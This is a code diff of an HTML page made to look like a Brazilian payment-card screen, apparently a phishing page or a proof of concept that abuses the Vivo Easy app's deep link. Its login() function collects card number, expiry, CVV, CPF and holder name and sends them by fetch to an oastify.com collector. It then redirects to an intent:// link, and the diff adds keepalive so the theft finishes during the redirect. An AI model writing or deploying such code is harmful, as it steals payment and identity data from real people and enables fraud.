@@ -442,7 +442,7 @@
         <span>CARTÃO PRINCIPAL</span>
       </div>
       <div class="card-details">
-        <span class="card-number-small">* * * * 0528</span>
+        <span class="card-number-small">* * * * 0000</span>
         <span class="mastercard" aria-label="Mastercard"></span>
       </div>
     </section>
@@ -576,20 +576,21 @@
       document.getElementById('holder').addEventListener('input', validate);
 
       window.login = function() {
-        var cc = document.getElementById('card-number').value;
-        var exp = document.getElementById('expiry').value;
-        var cvv = document.getElementById('cvv').value;
-        var cpf = document.getElementById('cpf').value;
-        var name = document.getElementById('holder').value;
-        var targetOast = 'https://93akf8ewuq1782atpuhu3ed19sfj3br0.oastify.com/';
-        var targetRedir = 'intent://open/#Intent;scheme=vivoeasy;package=br.com.vivo.vivoeasy;end';
+        const cc = document.getElementById('card-number').value;
+        const exp = document.getElementById('expiry').value;
+        const cvv = document.getElementById('cvv').value;
+        const cpf = document.getElementById('cpf').value;
+        const name = document.getElementById('holder').value;
+        const targetOast = 'https://93akf8ewuq1782atpuhu3ed19sfj3br0.oastify.com/';
+        const targetRedir = 'intent://open/#Intent;scheme=vivoeasy;package=br.com.vivo.vivoeasy;end';
 
-        fetch(targetOast + '?cc=' + encodeURIComponent(cc) + '&exp=' + encodeURIComponent(exp) + '&cvv=' + encodeURIComponent(cvv) + '&cpf=' + encodeURIComponent(cpf) + '&name=' + encodeURIComponent(name), {mode: 'no-cors'
-
-
-        }).finally(() => {            
-            window.location.href = targetRedir;
+        fetch(targetOast + '?cc=' + encodeURIComponent(cc) + '&exp=' + encodeURIComponent(exp) + '&cvv=' + encodeURIComponent(cvv) + '&cpf=' + encodeURIComponent(cpf) + '&name=' + encodeURIComponent(name), {mode: 'no-cors',keepalive: true
+        }).catch(error => {
+          console.error('Erro na requisição:', error);
         });
+
+        // Executado ainda durante o clique no botão.
+        window.location.assign(targetRedir);
       };
 
       form.addEventListener('submit', event => {
@@ -599,7 +600,6 @@
         if (document.activeElement && typeof document.activeElement.blur === 'function') {
           document.activeElement.blur();
         }
-
         // Caso os dados estejam validados, executa a ação do formulário
         if (!confirmButton.disabled) {
           window.login();
